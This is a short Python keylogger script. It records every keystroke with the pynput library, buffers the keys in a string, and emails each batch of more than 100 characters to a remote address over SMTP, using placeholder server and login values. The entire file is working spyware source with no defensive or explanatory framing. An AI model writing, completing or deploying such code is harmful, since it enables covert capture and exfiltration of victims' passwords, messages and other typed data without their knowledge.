from pynput.keyboard import Listener
import smtplib

list_of_pressed_keys = ""

def send_email(message):
    smtp_object = smtplib.SMTP('smtp', 587)
    smtp_object.ehlo()
    smtp_object.starttls()
    smtp_object.login('email-login', 'email-pass')
    smtp_object.sendmail("NOBODY", "email", message.encode("utf-8"))
    smtp_object.quit()

def making_string():
    global list_of_pressed_keys
    if len(list_of_pressed_keys) > 100:
        send_email(list_of_pressed_keys)
        print("SEND")
        list_of_pressed_keys = ""

def on_press(key):
    global list_of_pressed_keys
    list_of_pressed_keys = list_of_pressed_keys + '{0}'.format(key)
    print(list_of_pressed_keys)
    print(len(list_of_pressed_keys))
    making_string()


def listening(press):
    with Listener(on_press=press) as listener:
        listener.join()

listening(on_press)
